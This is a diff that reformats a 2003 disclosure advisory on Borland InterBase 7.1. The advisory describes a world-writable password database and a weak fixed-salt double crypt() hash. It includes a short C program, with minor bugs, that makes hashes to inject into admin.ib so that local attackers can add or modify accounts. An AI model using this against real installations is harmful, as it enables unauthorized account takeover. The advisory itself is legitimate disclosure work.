@@ -1,64 +1,72 @@
-                                Advisory #: 24
-Title: Borland's InterBase 7.1 poor Password Data File Permissions and Password
-Hash
-Author:Larry W. Cashdollar, @_larry0
-Date: 2003-11-26
-Download Site: http://www.borland.com/interbase
-Vendor:Borland
-Vendor Notified: 2003-11-26
-Vendor Contact: disclosed via idefense
-Description: Borland InterBase raises the bar for performance and power in
-small footprint databases. Designed for use in situations where there is no
-database administrator or IT support, InterBase is powerful enough to support
-mission-critical applications, yet compact enough to run on very modest
-systems. It can be easily transported by disk, CD, or even dial-up download.
-And unlike enterprise databases that require expensive ecosystems of support
-and maintenance, InterBase requires virtually no maintenance.
-Vulnerability:
-The "information database" stored in the file admin4.pcb is read and writeable
-for all users with local access to the system. [root@Fester interbase]# ls -l /
-opt/interbase/admin.ib -rw-rw-rw- 1 root root 616497 Nov 20 10:04 /opt/
-interbase/admin.ib Not only is the password file stored read writeable by all
-local users but the password hash is done with one salt "9z" and then hashed
-again. As an addition to the permissions issue, I thought I should flesh out
-the fact that the double crypt() does not add any security to the hash with out
-the salt. The purpose of the salt is so that the same passwords dont always
-have the same hashes. With them removing the salt the hashes will always be the
-same for the same password reguardless of crypt() being called twice. This can
-be expressed in this line pesudo C: crypt(&crypt(user_password,"9z")[2],"9z")
-CVE-2004-1833
-JSON:Export
-Exploit Code:
-   1. Local attackers can exploit this vulnerability to add or modify accounts
-      in Interbase. The following C program will generate hashed passwords that
-      can be injected into admin.ib database.
-   2.  
-   3. /*Larry W. Cashdollar
-   4. Vapid Labs.
-   5. Borland Interbase 7.1 password creator. lwc@vapid.dhs.org */
-   6.  
-   7. #include <stdio.h>
-   8. #include <unistd.h>
-   9.  
-  10. #define SALT "9z"
-  11.  
-  12. int main (int argc, char *argv[]) {
-  13.  
-  14. char crypt1,crypt2;
-  15.  
-  16. if (!argv[1]) {
-  17.     printf ("Borland InterBase db password tool.\n Larry Cashdollar,
-      vapid labs\nEnter desired password as an argument\n");
-  18. exit();
-  19. }
-  20.         crypt1 =(char *) crypt (argv[1],SALT);
-  21.         crypt2 =(char *) crypt (&crypt1[2],SALT);
-  22.  
-  23.         printf("Double crypt() is: %s\n",crypt2);
-  24.         printf("With out salt (as stored in isc4.gdb/admin.ib:
-      %s\n",&crypt2[2]);
-  25.         return(0);
-  26. }
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/
-borland_interbase_db_vulnerablities.html
+
+                               Advisory #: 24
+
+   Title: Borland's InterBase 7.1 poor Password Data File Permissions and
+   Password Hash
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2003-11-26
+   Download Site: http://www.borland.com/interbase
+   Vendor: Borland
+   Vendor Notified: 2003-11-26
+   Vendor Contact: disclosed via idefense
+   Description: Borland InterBase raises the bar for performance and power
+   in small footprint databases. Designed for use in situations where
+   there is no database administrator or IT support, InterBase is powerful
+   enough to support mission-critical applications, yet compact enough to
+   run on very modest systems. It can be easily transported by disk, CD,
+   or even dial-up download. And unlike enterprise databases that require
+   expensive ecosystems of support and maintenance, InterBase requires
+   virtually no maintenance.
+   Vulnerability:
+   The "information database" stored in the file admin4.pcb is read and
+   writeable for all users with local access to the system. [root@Fester
+   interbase]# ls -l /opt/interbase/admin.ib -rw-rw-rw- 1 root root 616497
+   Nov 20 10:04 /opt/interbase/admin.ib Not only is the password file
+   stored read writeable by all local users but the password hash is done
+   with one salt "9z" and then hashed again. As an addition to the
+   permissions issue, I thought I should flesh out the fact that the
+   double crypt() does not add any security to the hash with out the salt.
+   The purpose of the salt is so that the same passwords dont always have
+   the same hashes. With them removing the salt the hashes will always be
+   the same for the same password reguardless of crypt() being called
+   twice. This can be expressed in this line pesudo C:
+   crypt(&crypt(user_password,"9z")[2],"9z")
+   CVE-2004-1833
+   JSON: Export
+   Exploit Code:
+
+    1. Local attackers can exploit this vulnerability to add or modify
+       accounts in Interbase. The following C program will generate hashed
+       passwords that can be injected into admin.ib database.
+    2.
+    3. /*Larry W. Cashdollar
+    4. Vapid Labs.
+    5. Borland Interbase 7.1 password creator. lwc@vapid.dhs.org */
+    6.
+    7. #include <stdio.h>
+    8. #include <unistd.h>
+    9.
+   10. #define SALT "9z"
+   11.
+   12. int main (int argc, char *argv[]) {
+   13.
+   14. char crypt1,crypt2;
+   15.
+   16. if (!argv[1]) {
+   17. printf ("Borland InterBase db password tool.\n Larry Cashdollar,
+       vapid labs\nEnter desired password as an argument\n");
+   18. exit();
+   19. }
+   20. crypt1 =(char *) crypt (argv[1],SALT);
+   21. crypt2 =(char *) crypt (&crypt1[2],SALT);
+   22.
+   23. printf("Double crypt() is: %s\n",crypt2);
+   24. printf("With out salt (as stored in isc4.gdb/admin.ib:
+       %s\n",&crypt2[2]);
+   25. return(0);
+   26. }
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/borland_interbase_db_vulnerablities
+   .html
